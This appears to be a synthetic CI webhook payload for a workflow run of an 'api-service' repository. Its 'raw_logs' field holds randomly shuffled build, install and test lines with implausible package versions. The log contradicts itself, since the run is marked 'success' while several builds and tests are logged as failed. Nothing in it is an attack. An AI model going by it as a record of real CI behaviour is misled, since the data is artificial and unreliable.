{
  "action": "completed",
  "workflow_run": {
    "id": 839,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-531",
    "head_sha": "7719bf12e5c6693cba862c9d69ed0fc32fac18ed",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-03T12:00:34.692702Z",
    "updated_at": "2025-12-03T12:04:47.722213Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (106ms)\nCompiling src/main.py...\nStep 9/10: Building\n  PASS: test_api_health (349ms)\n  PASS: test_auth_login (205ms)\n  PASS: test_cache_hit (473ms)\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-9920\nInstalling lodash@5.20.0\nCompiling src/utils.go...\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/main.py...\nCompiling src/service.java...\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (313ms)\nWARNING: lodash has known vulnerabilities\n  PASS: test_user_create (151ms)\nCompiling src/app.ts...\n\u2713 test completed\nFAILED: test_user_create\nCompiling src/utils.go...\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nException: TypeError\nCache hit for key-5151\nCompiling src/index.js...\n  PASS: test_user_create (238ms)\nCompiling src/service.java...\n  PASS: test_db_connect (468ms)\n\u2713 lint completed\nCache hit for key-7018\nInstalling lodash@2.5.0\nCache hit for key-8692\n  PASS: test_cache_hit (433ms)\nCache hit for key-5553\nStep 10/10: Building\n\u2713 build completed\nCache hit for key-7239\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nCache hit for key-5259\nCache hit for key-9706\nCache hit for key-5474\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_auth_login (317ms)\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_user_create (430ms)\nCache hit for key-8621\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-3283\n[12:00:34] INFO: Processing request\n\u2713 test completed\n\u2713 test completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nStep 7/10: Building\n\u2713 build completed\nCompiling src/utils.go...\nCache hit for key-5398\n  PASS: test_user_create (174ms)\nStep 9/10: Building\nCache hit for key-5557\n  PASS: test_db_connect (396ms)\nStep 9/10: Building\n\u2713 build completed\n\u2717 build failed with exit code 23\n  PASS: test_user_create (385ms)\nInstalling eslint@1.2.0\n  PASS: test_cache_hit (94ms)\nCompiling src/main.py...\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (45MB)\nWARNING: webpack has known vulnerabilities\n  PASS: test_api_health (261ms)\n\u2713 build completed\nStep 4/10: Building\nCache hit for key-6445\nWARNING: lodash has known vulnerabilities\nInstalling react@2.1.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-5577\n  PASS: test_db_connect (29ms)\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n\u2713 test completed\nInstalling webpack@2.3.0\n\u2713 test completed\nCompiling src/handler.rs...\n\u2713 build completed\nInstalling eslint@1.17.0\nArtifact uploaded: build.tar.gz (26MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:34] WARN: Deprecated API usage\nInstalling express@1.4.0\nInstalling jest@5.11.0\nArtifact uploaded: build.tar.gz (23MB)\nStep 6/10: Building\n  PASS: test_db_connect (209ms)\n  PASS: test_db_connect (227ms)\nStep 10/10: Building\nCache hit for key-7585\nCompiling src/handler.rs...\nCache hit for key-9761\nInstalling react@1.15.0\nCompiling src/utils.go...\nStep 9/10: Building\nInstalling axios@1.10.0\nCompiling src/app.ts...\nWARNING: webpack has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nInstalling eslint@2.5.0\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:34] ERROR: Connection failed\nCompiling src/index.js...\nStep 5/10: Building\nCache hit for key-9400\n\u2713 lint completed\nInstalling express@1.16.0\nInstalling eslint@2.20.0\nCache hit for key-5495\nInstalling eslint@1.15.0\nCompiling src/index.js...\nCache hit for key-5255\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (320ms)\nStep 3/10: Building\n\u2713 test completed\nInstalling jest@4.1.0\nStep 6/10: Building\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nInstalling axios@5.19.0\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/index.js...\nInstalling jest@4.11.0\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-9163\n  PASS: test_db_connect (246ms)\n[12:00:34] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nStep 9/10: Building\nInstalling express@4.0.0\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 test completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\n\u2713 test completed\nInstalling prettier@2.12.0\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nStep 8/10: Building\nInstalling jest@3.18.0\n  PASS: test_user_create (165ms)\nInstalling express@1.18.0\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (262ms)\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-6209\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/handler.rs...\nCompiling src/app.ts...\nStep 6/10: Building\n  PASS: test_db_connect (243ms)\nArtifact uploaded: build.tar.gz (47MB)\nStep 4/10: Building\n\u2717 build failed with exit code 10\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (184ms)\n[12:00:34] WARN: Deprecated API usage\nInstalling jest@1.12.0\nInstalling express@1.17.0\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (499ms)\nCompiling src/utils.go...\nStep 5/10: Building\nInstalling axios@5.3.0\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:34] INFO: Processing request\nWARNING: express has known vulnerabilities\n\u2713 build completed\nStep 3/10: Building\nStep 4/10: Building\nException: ValueError\n  PASS: test_db_connect (429ms)\nStep 5/10: Building\nCompiling src/index.js...\n  PASS: test_cache_hit (425ms)\nCache hit for key-5580\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (379ms)\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_user_create (155ms)\nCompiling src/handler.rs...\nCache hit for key-8030\nStep 8/10: Building\n=== Step setup_node completed ===\n=== Step: deploy_staging ===\n\u2713 test completed\n  PASS: test_api_health (375ms)\nInstalling axios@5.1.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\n\u2713 build completed\nInstalling eslint@5.10.0\n  PASS: test_cache_hit (455ms)\n  PASS: test_user_create (423ms)\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (403ms)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\n\u2713 build completed\n  PASS: test_user_create (439ms)\nStep 9/10: Building\nStep 5/10: Building\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nStep 4/10: Building\n  PASS: test_user_create (394ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling express@5.0.0\nInstalling webpack@1.5.0\nStep 2/10: Building\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (12ms)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_auth_login (406ms)\nCache hit for key-4377\nCompiling src/main.py...\nCompiling src/main.py...\nInstalling eslint@2.2.0\nInstalling express@5.19.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\nCache hit for key-7016\nInstalling express@1.4.0\nCache hit for key-8615\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_db_connect (269ms)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling jest@2.8.0\n\u2713 build completed\n  PASS: test_cache_hit (58ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 test completed\n\u2713 build completed\nInstalling react@3.0.0\nStep 4/10: Building\nStep 7/10: Building\nStep 4/10: Building\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nStep 5/10: Building\n[12:00:34] INFO: Processing request\nInstalling jest@3.13.0\nStep 3/10: Building\nInstalling express@5.13.0\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-7144\nStep 6/10: Building\nInstalling webpack@5.18.0\nInstalling webpack@4.19.0\n\u2717 build failed with exit code 33\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 2/10: Building\nInstalling prettier@1.9.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nStep 3/10: Building\n[12:00:34] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nCache hit for key-7915\nStep 7/10: Building\n\u2713 test completed\n  PASS: test_api_health (437ms)\nWARNING: lodash has known vulnerabilities\nInstalling webpack@3.1.0\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling lodash@4.11.0\nCache hit for key-2739\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (11MB)\nInstalling react@2.7.0\nStep 6/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/service.java...\n[12:00:34] ERROR: Connection failed\nInstalling webpack@4.6.0\n\u2713 test completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (4MB)\nInstalling jest@1.6.0\n\u2713 build completed\nStep 3/10: Building\nWARNING: express has known vulnerabilities\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:34] INFO: Processing request\nCache hit for key-3973\nStep 3/10: Building\nInstalling lodash@4.2.0\nStep 2/10: Building\nCache hit for key-5225\nInstalling prettier@2.0.0\nArtifact uploaded: build.tar.gz (46MB)\nInstalling react@3.20.0\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n\u2713 build completed\nStep 9/10: Building\n\u2713 build completed\nCompiling src/utils.go...\n  PASS: test_auth_login (30ms)\nCompiling src/utils.go...\n\u2713 build completed\n\u2713 lint completed\nInstalling lodash@5.6.0\n\u2713 build completed\nInstalling express@5.4.0\n\u2713 lint completed\n  PASS: test_auth_login (291ms)\nStep 10/10: Building\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling express@1.0.0\nCache hit for key-3245\nInstalling axios@3.4.0\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/index.js...\n\u2713 build completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling webpack@3.9.0\n\u2713 build completed\n  PASS: test_auth_login (369ms)\n\u2713 build completed\nInstalling express@5.1.0\n  PASS: test_user_create (87ms)\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 test completed\n\u2713 test completed\n  PASS: test_db_connect (305ms)\nInstalling react@3.13.0\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_auth_login (151ms)\n[12:00:34] INFO: Processing request\nCache hit for key-5186\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nCache hit for key-2725\n[12:00:34] INFO: Processing request\nInstalling eslint@1.3.0\n\u2713 build completed\n  PASS: test_auth_login (282ms)\nCompiling src/main.py...\n  PASS: test_user_create (415ms)\n[12:00:34] ERROR: Connection failed\n[12:00:34] INFO: Processing request\nInstalling react@4.20.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (20ms)\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling axios@1.5.0\n[12:00:34] ERROR: Connection failed\nInstalling lodash@5.7.0\n\u2713 build completed\n[12:00:34] INFO: Processing request\nInstalling axios@1.8.0\n\u2713 build completed\n  PASS: test_auth_login (416ms)\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n  PASS: test_cache_hit (14ms)\nInstalling express@1.10.0\n  PASS: test_user_create (30ms)\nCompiling src/utils.go...\n  PASS: test_user_create (479ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (6MB)\nInstalling axios@1.16.0\nStep 6/10: Building\nCompiling src/service.java...\nStep 4/10: Building\n  PASS: test_user_create (232ms)\nInstalling react@2.1.0\nException: TypeError\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/app.ts...\nCompiling src/index.js...\nCompiling src/service.java...\n=== Step deploy_staging completed ===\n=== Step: save_cache ===\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 9/10: Building\nCache hit for key-3240\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-3257\nCache hit for key-3529\nInstalling axios@3.16.0\nInstalling jest@5.9.0\nCache hit for key-7490\nException: ValueError\nCache hit for key-7414\nInstalling prettier@2.1.0\nStep 4/10: Building\nCache hit for key-4676\n  PASS: test_db_connect (17ms)\nInstalling axios@5.2.0\n\u2713 build completed\n  PASS: test_auth_login (323ms)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:34] WARN: Deprecated API usage\nInstalling lodash@3.10.0\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\nFAILED: test_auth_login\n[12:00:34] INFO: Processing request\nCache hit for key-6687\nArtifact uploaded: build.tar.gz (43MB)\nStep 4/10: Building\n\u2713 test completed\n  PASS: test_api_health (136ms)\nInstalling jest@5.20.0\n  PASS: test_cache_hit (500ms)\n  PASS: test_user_create (34ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\nWARNING: react has known vulnerabilities\nCompiling src/handler.rs...\nCache hit for key-7478\nCache hit for key-5423\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_auth_login (432ms)\n[12:00:34] WARN: Deprecated API usage\nStep 8/10: Building\nCompiling src/service.java...\n  PASS: test_user_create (300ms)\nStep 5/10: Building\nStep 8/10: Building\nStep 5/10: Building\nStep 9/10: Building\nCompiling src/main.py...\nInstalling axios@2.13.0\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (221ms)\n[12:00:34] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (250ms)\nStep 3/10: Building\nCache hit for key-6457\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 9/10: Building\n\u2713 build completed\nStep 4/10: Building\nStep 8/10: Building\n\u2713 lint completed\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (317ms)\nCache hit for key-2607\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\n\u2713 build completed\nCache hit for key-1541\n  PASS: test_user_create (378ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (24MB)\n\u2717 build failed with exit code 5\n[12:00:34] WARN: Deprecated API usage\nCompiling src/utils.go...\nFAILED: test_cache_hit\nStep 9/10: Building\nCompiling src/index.js...\nCache hit for key-7004\nInstalling react@4.11.0\nInstalling prettier@1.18.0\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nStep 9/10: Building\nCache hit for key-3948\nCompiling src/index.js...\nInstalling express@2.9.0\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-6066\n  PASS: test_api_health (363ms)\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (48MB)\nWARNING: lodash has known vulnerabilities\n  PASS: test_auth_login (355ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (6MB)\nStep 4/10: Building\nStep 10/10: Building\nCompiling src/handler.rs...\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-7987\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@2.16.0\nInstalling express@4.4.0\nInstalling jest@4.6.0\nCompiling src/service.java...\n\u2713 test completed\n\u2713 test completed\nWARNING: jest has known vulnerabilities\nInstalling eslint@5.15.0\nStep 3/10: Building\nStep 10/10: Building\nCache hit for key-4834\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_api_health (479ms)\nCache hit for key-2685\nCache hit for key-8240\nStep 3/10: Building\n  PASS: test_cache_hit (110ms)\n\u2713 test completed\n[12:00:34] INFO: Processing request\nInstalling jest@4.1.0\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-5099\nStep 1/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-6225\n\u2713 build completed\nStep 4/10: Building\nStep 1/10: Building\n[12:00:34] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_cache_hit (466ms)\nException: TypeError\nCache hit for key-8211\nInstalling jest@2.3.0\nArtifact uploaded: build.tar.gz (17MB)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (43MB)\nInstalling eslint@3.18.0\nCache hit for key-6276\nInstalling axios@1.6.0\nInstalling react@3.11.0\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_auth_login\n[12:00:34] INFO: Processing request\nInstalling express@5.0.0\n\u2713 test completed\n  PASS: test_auth_login (33ms)\nCache hit for key-5973\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_api_health (189ms)\nArtifact uploaded: build.tar.gz (28MB)\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (38MB)\nStep 10/10: Building\n  PASS: test_db_connect (209ms)\nStep 4/10: Building\nCache hit for key-9290\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (167ms)\nInstalling eslint@1.12.0\n\u2713 lint completed\nInstalling eslint@4.19.0\n  PASS: test_auth_login (241ms)\nCompiling src/app.ts...\n\u2713 build completed\n  PASS: test_user_create (220ms)\nInstalling lodash@1.4.0\nCompiling src/main.py...\n\u2713 test completed\nCompiling src/index.js...\nCompiling src/utils.go...\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_cache_hit (104ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: lodash has known vulnerabilities\nCompiling src/service.java...\nInstalling prettier@4.6.0\nCache hit for key-7706\n\u2713 lint completed\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-9999\nStep 2/10: Building\n\u2713 lint completed\nCache hit for key-2760\nStep 4/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (35MB)\nInstalling prettier@1.1.0\n\u2713 test completed\nCache hit for key-3953\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (191ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 lint completed\n  PASS: test_auth_login (52ms)\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\nCompiling src/index.js...\n  PASS: test_api_health (281ms)\nCache hit for key-4400\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (23MB)\nInstalling eslint@5.2.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nCache hit for key-1244\nStep 2/10: Building\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (127ms)\n\u2713 lint completed\nStep 10/10: Building\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling lodash@1.5.0\n\u2713 test completed\nInstalling axios@5.9.0\n  PASS: test_auth_login (474ms)\n[12:00:34] WARN: Deprecated API usage\nInstalling prettier@5.11.0\nInstalling prettier@3.7.0\nInstalling react@4.8.0\nCache hit for key-6946\n\u2713 test completed\n\u2713 lint completed\nInstalling express@3.17.0\nInstalling express@3.9.0\nCompiling src/main.py...\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\nWARNING: express has known vulnerabilities\nCache hit for key-4556\nInstalling prettier@1.13.0\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (45MB)\nStep 6/10: Building\n  PASS: test_auth_login (24ms)\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 3/10: Building\nStep 4/10: Building\n  PASS: test_cache_hit (299ms)\nCache hit for key-5417\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (382ms)\nInstalling eslint@5.3.0\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 lint completed\nInstalling react@2.0.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling webpack@1.18.0\n[12:00:34] INFO: Processing request\nInstalling jest@2.8.0\nStep 5/10: Building\n  PASS: test_user_create (117ms)\nCompiling src/index.js...\n  PASS: test_api_health (122ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-4600\n  PASS: test_auth_login (402ms)\n  PASS: test_db_connect (118ms)\n  PASS: test_api_health (85ms)\nArtifact uploaded: build.tar.gz (44MB)\nFAILED: test_user_create\n[12:00:34] INFO: Processing request\nInstalling eslint@1.5.0\nCache hit for key-7000\n[12:00:34] WARN: Deprecated API usage\nStep 3/10: Building\n\u2713 build completed\n  PASS: test_auth_login (472ms)\nArtifact uploaded: build.tar.gz (5MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: lodash has known vulnerabilities\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:34] WARN: Deprecated API usage\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-5078\n  PASS: test_api_health (23ms)\nArtifact uploaded: build.tar.gz (14MB)\nStep 9/10: Building\nStep 1/10: Building\nCompiling src/index.js...\nStep 6/10: Building\nStep 4/10: Building\nCache hit for key-5097\nStep 10/10: Building\nCompiling src/service.java...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (40MB)\nInstalling prettier@5.18.0\n  PASS: test_api_health (123ms)\n  PASS: test_db_connect (134ms)\nCache hit for key-7722\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] ERROR: Connection failed\nInstalling eslint@3.0.0\nCache hit for key-5147\n  PASS: test_auth_login (43ms)\n\u2713 lint completed\nInstalling react@4.11.0\n  PASS: test_db_connect (224ms)\nInstalling eslint@3.6.0\nCache hit for key-1568\nInstalling lodash@1.11.0\nInstalling lodash@4.4.0\nInstalling express@1.10.0\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:34] INFO: Processing request\nCache hit for key-3179\nCompiling src/service.java...\n  PASS: test_cache_hit (27ms)\nCache hit for key-1656\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_user_create (296ms)\n  PASS: test_api_health (222ms)\nStep 7/10: Building\nCompiling src/index.js...\n  PASS: test_auth_login (367ms)\n  PASS: test_cache_hit (92ms)\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nInstalling eslint@3.6.0\nStep 8/10: Building\nCache hit for key-4347\nCache hit for key-2636\nCompiling src/app.ts...\n  PASS: test_auth_login (428ms)\nStep 5/10: Building\nInstalling webpack@2.18.0\nInstalling express@2.7.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (440ms)\nCache hit for key-3291\nCache hit for key-3852\nInstalling express@4.3.0\n\u2713 lint completed\nInstalling webpack@4.8.0\nCache hit for key-2554\nCache hit for key-9386\nFAILED: test_auth_login\nCompiling src/service.java...\n\u2713 build completed\nInstalling lodash@4.5.0\nStep 4/10: Building\nStep 6/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nInstalling react@3.3.0\nStep 3/10: Building\n\u2713 build completed\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nInstalling express@4.11.0\n  PASS: test_user_create (132ms)\n  PASS: test_cache_hit (33ms)\n  PASS: test_db_connect (219ms)\nCompiling src/utils.go...\nInstalling axios@2.9.0\n\u2713 lint completed\nException: TypeError\n  PASS: test_auth_login (237ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nCompiling src/main.py...\n  PASS: test_auth_login (358ms)\n[12:00:34] INFO: Processing request\nCache hit for key-1038\n[12:00:34] INFO: Processing request\nStep 1/10: Building\n  PASS: test_api_health (83ms)\n\u2713 build completed\n[12:00:34] ERROR: Connection failed\n[12:00:34] ERROR: Connection failed\nStep 9/10: Building\n  PASS: test_api_health (474ms)\nStep 5/10: Building\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nCache hit for key-6115\n\u2713 lint completed\nStep 10/10: Building\n  PASS: test_user_create (483ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/utils.go...\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nInstalling prettier@3.15.0\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\n[12:00:34] WARN: Deprecated API usage\nStep 9/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\n\u2713 test completed\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_user_create (419ms)\nInstalling react@3.3.0\nStep 7/10: Building\nException: NullPointerException\nInstalling axios@4.10.0\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_auth_login (116ms)\nCache hit for key-7274\n\u2713 test completed\n  PASS: test_api_health (19ms)\nCompiling src/handler.rs...\nCache hit for key-5062\nCompiling src/handler.rs...\nCache hit for key-9728\nException: NullPointerException\n\u2713 test completed\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_cache_hit (351ms)\n[12:00:34] INFO: Processing request\nInstalling express@5.12.0\nArtifact uploaded: build.tar.gz (12MB)\nInstalling express@3.19.0\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\n\u2713 test completed\nInstalling prettier@1.14.0\nCompiling src/index.js...\nCompiling src/handler.rs...\nCache hit for key-2188\nWARNING: axios has known vulnerabilities\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\nInstalling axios@4.18.0\n\u2713 test completed\nCache hit for key-1156\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nStep 2/10: Building\nCompiling src/handler.rs...\nInstalling express@1.5.0\nArtifact uploaded: build.tar.gz (7MB)\nInstalling express@3.6.0\n  PASS: test_api_health (258ms)\nCache hit for key-9825\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_api_health (132ms)\nStep 1/10: Building\nCompiling src/app.ts...\nStep 2/10: Building\nCache hit for key-7159\nStep 9/10: Building\n[12:00:34] INFO: Processing request\n\u2713 build completed\nStep 10/10: Building\nStep 2/10: Building\n[12:00:34] INFO: Processing request\nCache hit for key-6994\n[12:00:34] INFO: Processing request\nStep 10/10: Building\n  PASS: test_api_health (437ms)\nStep 10/10: Building\nInstalling axios@3.12.0\n  PASS: test_auth_login (323ms)\nArtifact uploaded: build.tar.gz (3MB)\nStep 3/10: Building\n  PASS: test_auth_login (477ms)\n  PASS: test_user_create (431ms)\nCompiling src/utils.go...\n[12:00:34] WARN: Deprecated API 